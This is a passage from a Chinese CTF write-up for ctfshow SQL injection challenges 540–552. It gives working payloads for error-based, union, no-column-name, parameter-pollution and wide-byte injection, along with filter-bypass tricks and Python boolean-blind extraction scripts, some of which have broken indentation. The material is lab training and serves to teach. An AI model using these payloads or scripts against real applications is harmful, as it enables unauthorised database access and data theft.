class="hljs-attribute">id</span>=1&#x27;and updatexml(1,concat(0x7e,right((select group_concat(flag4)<span class="hljs-keyword">from</span> ctfshow.flag),20),0x7e),1);%00<br>因为只能回显32个字符，所以使用right函数控制字符串回显<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-540-二次注入"><a href="#web-540-二次注入" class="headerlink" title="web-540 二次注入"></a>web-540 二次注入</h2><p>当你创建一个admin’#的用户并登录后改变他的密码</p>
+<p>回来登录发现admin的密码也被改变了</p>
+<p>这样就可以确定SQL语句为 ‘ 闭合</p>
+<p>若是未改变则不是 ‘ 闭合</p>
+<p>原理：</p>
+<p><strong>Sql 语句变为 UPDATE users SET passwd&#x3D;”New_Pass” WHERE username &#x3D;’</strong> </p>
+<p><strong>admin’ # ‘ AND</strong></p>
+<p><strong>password&#x3D;’ ， 也 就 是 执 行 了 UPDATE users SET passwd&#x3D;”New_Pass” WHERE username &#x3D;’</strong> </p>
+<p><strong>admin’</strong> </p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">创建一个admin&#x27;#用户，密码设为<span class="hljs-number">123456</span><br>然后修改密码<br>改为123，<br>然后我们就能登录admin用户了，密码被我们改成了123<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-541-or、and双写绕过、id-1’"><a href="#web-541-or、and双写绕过、id-1’" class="headerlink" title="web-541 or、and双写绕过、id&#x3D;1’"></a>web-541 or、and双写绕过、id&#x3D;1’</h2><p>过滤了or和and可以使用双写绕过</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; aandnd updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,right((select group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags),<span class="hljs-number">20</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p>也可以使用||来代替and或or</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; || updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,right((select group_concat(flag4s)from ctfshow.flags),<span class="hljs-number">20</span>),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-542-无列名注入-id-1、innodb"><a href="#web-542-无列名注入-id-1、innodb" class="headerlink" title="web-542 无列名注入 id&#x3D;1、innodb"></a>web-542 无列名注入 id&#x3D;1、innodb</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_66013948/article/details/136424994">SQL注入之 无列名注入 原理详解</a></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">默认数据库mysql查询+无列名注入<br><br>判断闭合方式。<br>?id=<span class="hljs-number">1</span> 正常回显<br><br>?id=<span class="hljs-number">1</span>%<span class="hljs-number">23</span> 正常回显<br><br>说明不需要闭合<br><br>注入方式尝试<br>先尝试下<span class="hljs-keyword">union</span>联合查询：<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br><br>页面成功回显，说明存在联合查询注入点<br><br>绕过过滤<br>尝试获取数据库信息<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">SELECT</span> group_concat(<span class="hljs-built_in">SCHEMA_NAME</span>) <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA),<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br><br>页面回显报错，说明大概率存在过滤，过滤information_schema相关内容<br><br>这时使用默认的数据库mysql<br><br>获取所有数据库信息<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(database_name) <span class="hljs-keyword">from</span> mysql.innodb_table_stats),<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br><br>获取数据库中数据表信息<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name=<span class="hljs-string">&#x27;ctfshow&#x27;</span>),<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br><br>无列名注入获取flag<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(b),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ctfshow.flags <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)a <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-543-空格过滤绕过、or替换、-00sql结束符"><a href="#web-543-空格过滤绕过、or替换、-00sql结束符" class="headerlink" title="web-543 空格过滤绕过、or替换、;%00sql结束符"></a>web-543 空格过滤绕过、or替换、;%00sql结束符</h2><p>过滤了空格</p>
+<p>对于空格，有较多的方法：</p>
+<p>%09 TAB 键（水平）</p>
+<p>%0a 新建一行%0a (后面的空格不能省)</p>
+<p>%0c 新的一页</p>
+<p>%0d return 功能</p>
+<p>%0b TAB 键（垂直）</p>
+<p>%a0 空格</p>
+<p>但是都不行所以:</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">or</span>替换+空格过滤绕过+<span class="hljs-keyword">sql</span>结束字符过滤<br><br>确定闭合方式<br>?di=<span class="hljs-number">1</span> 正常回显<br><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; 回显异常，报错信息</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span>%<span class="hljs-number">23</span> 报错 后面有<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&#x27;，说明%23闭合失败，可能被过滤，使用“;%00”替代</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span>;%<span class="hljs-number">00</span> 回显正常，这里确定为单引号闭合<br><br>注入方式尝试<br>括号和注释符被过滤，<span class="hljs-keyword">union</span>联合查询不容易使用括号过滤，考虑到页面回显报错，使用报错注入试试<br><br>?id=<span class="hljs-number">100</span><span class="hljs-string">&#x27;(or)updatexml(1,concat(0x7e,(select(database())),0x7e),1);%00</span><br><span class="hljs-string"></span><br><span class="hljs-string">页面提示：()updatexml(1,concat(0x7e,(select(database())),0x7e),1);</span><br><span class="hljs-string"></span><br><span class="hljs-string">提示表明，“or”没显示，表名“or”被替换，那么使用“||”替代</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=100&#x27;</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(database_name))<span class="hljs-keyword">from</span>(mysql.innodb_table_stats)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);%<span class="hljs-number">00</span><br><br>?id=<span class="hljs-number">100</span><span class="hljs-string">&#x27;||updatexml(1,concat(0x7e,(select(table_name)from(mysql.innodb_table_stats)where(database_name)=&#x27;</span>ctfshow<span class="hljs-string">&#x27;),0x7e),1);%00</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=100&#x27;</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(infoorrmation_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)=<span class="hljs-string">&#x27;flags&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);%<span class="hljs-number">00</span><br><br>?id=<span class="hljs-number">100</span><span class="hljs-string">&#x27;||updatexml(1,concat(0x7e,right((select(flag4s)from(ctfshow.flags)),32),0x7e),1);%00</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=100&#x27;</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,right((<span class="hljs-keyword">select</span>(flag4s)<span class="hljs-keyword">from</span>(ctfshow.flags)),<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-544-绕过过滤、布尔盲注"><a href="#web-544-绕过过滤、布尔盲注" class="headerlink" title="web-544 绕过过滤、布尔盲注"></a>web-544 绕过过滤、布尔盲注</h2><p>既不显示报错信息又过滤了空格</p>
+<p>id&#x3D;1成功</p>
+<p>id&#x3D;1’报错</p>
+<p>id&#x3D;1’;%00还报错则不是’闭合</p>
+<p>id&#x3D;1’)报错</p>
+<p>id&#x3D;1’);%00成功则是’)闭合</p>
+<ol>
+<li>经过测试，过滤的字符有：</li>
+</ol>
+<ul>
+<li><ul>
+<li><ul>
+<li>\ &#x2F; – –+ &#x2F;**&#x2F; %23 and or</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">&quot;http://795d93a2-1df8-46f4-b6ae-c1bbb84c1157.challenge.ctf.show/?id=100&#x27;)&quot;</span><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>i = 0<br><br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>        mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>        payload = f<span class="hljs-string">&#x27;||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0);%00&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;||if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0);%00&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;||if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0);%00&#x27;</span><br>        r = requests.get(url+payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Dumb&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">head</span> = mid + 1<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">tail</span> = mid<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>        result += chr(<span class="hljs-built_in">head</span>)<br>        <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-545-大小写混合绕过、-0a绕过、-00sql结束符、id-100’"><a href="#web-545-大小写混合绕过、-0a绕过、-00sql结束符、id-100’" class="headerlink" title="web-545 大小写混合绕过、%0a绕过、;%00sql结束符、id&#x3D;100’"></a>web-545 大小写混合绕过、%0a绕过、;%00sql结束符、id&#x3D;100’</h2><p>用%0a即可绕过</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">id<span class="hljs-operator">=</span><span class="hljs-number">100</span>&#x27;<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEct<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from<span class="hljs-variable">%0</span>ainformation_schema.tables<span class="hljs-variable">%0</span>awhere<span class="hljs-variable">%0</span>a table_schema<span class="hljs-operator">=</span>&#x27;ctfshow&#x27;<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br><br>id<span class="hljs-operator">=</span><span class="hljs-number">100</span>&#x27;<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEct<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(column_name)from<span class="hljs-variable">%0</span>ainformation_schema.columns<span class="hljs-variable">%0</span>awhere<span class="hljs-variable">%0</span>a table_name<span class="hljs-operator">=</span>&#x27;flags&#x27;<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">100</span>&#x27;<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEct<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>concat(id<span class="hljs-punctuation">,</span>&#x27;-&#x27;<span class="hljs-punctuation">,</span>flag<span class="hljs-number">4</span>s)from<span class="hljs-variable">%0</span>actfshow.flags<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br></code></pre></td></tr></table></figure>
+
+<p>也可以盲注</p>
+<p>过滤了select</p>
+<p>select大小写混合</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">&quot;http://857803fc-3f61-4ec6-8084-214ad94d5be4.challenge.ctf.show:8080/&quot;</span><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>i = 0<br><br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>    mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>    <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span><br>    <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>    payload = f<span class="hljs-string">&#x27;if(ascii(substr((SeLect(group_concat(flag4s))from(ctfshow.flags)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;id&#x27;</span>: f<span class="hljs-string">&quot;100&#x27;||&#123;payload&#125;||&#x27;0&quot;</span><br>    &#125;<br>    r = requests.get(url,params=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Dumb&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">head</span> = mid + 1<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">tail</span> = mid<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>    result += chr(<span class="hljs-built_in">head</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">break</span><br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-546-id-100”、其他同上"><a href="#web-546-id-100”、其他同上" class="headerlink" title="web-546 id&#x3D;100”、其他同上"></a>web-546 id&#x3D;100”、其他同上</h2><p>就换了个闭合，其他一样</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">?id=<span class="hljs-number">111</span><span class="hljs-string">&quot;%0auNIon%0asElEct<span class="hljs-variable">%0a</span>  1,2,group_concat(table_name)from<span class="hljs-variable">%0ainformation_schema</span>.tables%0awhere<span class="hljs-variable">%0a</span>  table_schema=&#x27;ctfshow&#x27;<span class="hljs-variable">%0a</span> ;<span class="hljs-variable">%00</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">id=111&quot;</span>%0auNIon%0asElEct<span class="hljs-variable">%0a</span>    <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag4s)from<span class="hljs-variable">%0actfshow</span>.flags<span class="hljs-variable">%0a</span> ;<span class="hljs-variable">%00</span><br></code></pre></td></tr></table></figure>
+
+<p>python脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">&quot;http://642ba949-092a-4d73-bdc6-3914a631fdf0.challenge.ctf.show:8080/&quot;</span><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br>i = 0<br><br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>    mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>    <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span><br>    <span class="hljs-comment"># payload = f&#x27;if(ascii(substr((SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>    payload = f<span class="hljs-string">&#x27;if(ascii(substr((SeLect(group_concat(flag4s))from(ctfshow.flags)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;id&#x27;</span>: f<span class="hljs-string">&#x27;100&quot;||&#123;payload&#125;||&quot;0&#x27;</span><br>    &#125;<br>    r = requests.get(url,params=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Dumb&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">head</span> = mid + 1<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">tail</span> = mid<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>    result += chr(<span class="hljs-built_in">head</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">break</span><br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-547-大小写混合绕过、复写绕过"><a href="#web-547-大小写混合绕过、复写绕过" class="headerlink" title="web-547 大小写混合绕过、复写绕过"></a>web-547 大小写混合绕过、复写绕过</h2><p>过滤的有点奇怪多进行尝试</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">111</span>&#x27;)<span class="hljs-variable">%0</span>aunion<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEctselect<span class="hljs-variable">%0</span>a  <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from<span class="hljs-variable">%0</span>ainformation_schema.tables<span class="hljs-variable">%0</span>awhere<span class="hljs-variable">%0</span>a  table_schema<span class="hljs-operator">=</span>&#x27;ctfshow&#x27;<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">111</span>&#x27;)<span class="hljs-variable">%0</span>aunion<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEctselect<span class="hljs-variable">%0</span>a  <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(column_name)from<span class="hljs-variable">%0</span>ainformation_schema.columns<span class="hljs-variable">%0</span>awhere<span class="hljs-variable">%0</span>a  table_name<span class="hljs-operator">=</span>&#x27;flags&#x27;<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">111</span>&#x27;)<span class="hljs-variable">%0</span>aunion<span class="hljs-variable">%0</span>auNIon<span class="hljs-variable">%0</span>asElEctselect<span class="hljs-variable">%0</span>a  <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(flag<span class="hljs-number">4</span>s)from<span class="hljs-variable">%0</span>actfshow.flags<span class="hljs-variable">%0</span>a <span class="hljs-comment">;%00</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-548-同上"><a href="#web-548-同上" class="headerlink" title="web-548 同上"></a>web-548 同上</h2><p>和上题一模一样</p>
+<hr>
+<h2 id="web-549-代码逻辑漏洞导致的重复参数注入"><a href="#web-549-代码逻辑漏洞导致的重复参数注入" class="headerlink" title="web-549 代码逻辑漏洞导致的重复参数注入"></a>web-549 代码逻辑漏洞导致的重复参数注入</h2><p>思路（代码逻辑漏洞导致的重复参数注入）：</p>
+<p>二十九关就是会对输入的参数进行校验是否为数字，但是在对参数值进行校验之前的提取时候只提取了第一个id值，如果我们有两个id参数，第一个id参数正常数字，第二个id参数进行sql注入。</p>
+<p>根据源代码，get提交的参数，如果重名，则以最后一个为准，所以sql语句在接受相同参数时候接受的是后面的参数值。<br>但是验证id是否是数字却只是验证了第一个id参数</p>
+<p>其实第29关（web549）是用jsp搭建的服务器，所以建议在电脑中安装Jspstudy来安装Jsp的环境。</p>
+<p>构造两个id参数，index.php?id&#x3D;1&amp;id&#x3D;2，Apache PHP 会解析最后一个参数，Tomcat JSP 会解析第一个参数</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-550-id-0”-代码逻辑漏洞导致的重复参数注入"><a href="#web-550-id-0”-代码逻辑漏洞导致的重复参数注入" class="headerlink" title="web-550 id&#x3D;0” 代码逻辑漏洞导致的重复参数注入"></a>web-550 id&#x3D;0” 代码逻辑漏洞导致的重复参数注入</h2><p>“闭合其他和上题一样</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot;union select 1,2,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags;%00<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-551-id-0”-代码逻辑漏洞导致的重复参数注入"><a href="#web-551-id-0”-代码逻辑漏洞导致的重复参数注入" class="headerlink" title="web-551 id&#x3D;0”) 代码逻辑漏洞导致的重复参数注入"></a>web-551 id&#x3D;0”) 代码逻辑漏洞导致的重复参数注入</h2><p>“)闭合其他和上题一样</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot;)union select 1,2,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags;%00<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-552-宽字节注入、无列名注入"><a href="#web-552-宽字节注入、无列名注入" class="headerlink" title="web-552 宽字节注入、无列名注入"></a>web-552 宽字节注入、无列名注入</h2><p>通过测试发现1’会被转化为1\‘</p>
+<p><strong>这里利用了宽字节注入</strong></p>
+<p>GBK 是占两个字节（也就是名叫宽字节，只要字节大于1的都是）</p>
+<p>“ \ ”即url里面的“ %5c ”</p>
+<p>我们在前面加上一个%df让他跟%5c组成%df%5c变成<strong>縗</strong></p>
+<p>不只是能和%df组合 组合后ascill大于128就可以</p>
+<ol>
+<li>GBK首字节对应0x81-0xfe(129-239),尾字节对应0x40-0xfe(64-126)(除了0x7f【128】)</li>
+</ol>
+<p>比如一些 %df’ %81’ %82’ %de’ 等等</p>
